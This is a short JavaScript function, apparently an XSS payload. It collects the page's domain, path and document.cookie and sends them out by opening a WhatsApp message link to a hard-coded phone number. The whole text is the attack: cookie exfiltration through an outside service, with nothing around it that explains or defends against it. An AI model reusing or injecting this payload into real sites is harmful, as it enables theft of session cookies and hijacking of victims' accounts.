function sendWhatsAppMessageViaUrl(phoneNumber) {
    var textData = 'XSS Alert in ' + document.domain +
        '\n------------------------------------------------' +
        '\n\n- URL Target -\n' + document.location.hostname + document.location.pathname +
        '\n\n- Document Cookie -\n' + document.cookie;

    var encodedMessage = encodeURIComponent(textData);
    var url = 'https://api.whatsapp.com/send/?phone=' + phoneNumber + '&text=' + encodedMessage + '&type=phone_number';

    // Open the WhatsApp send message URL in a new tab
    window.open(url, '_blank');
}

// Example usage:
sendWhatsAppMessageViaUrl('+18056009130'); // Replace with the desired phone number
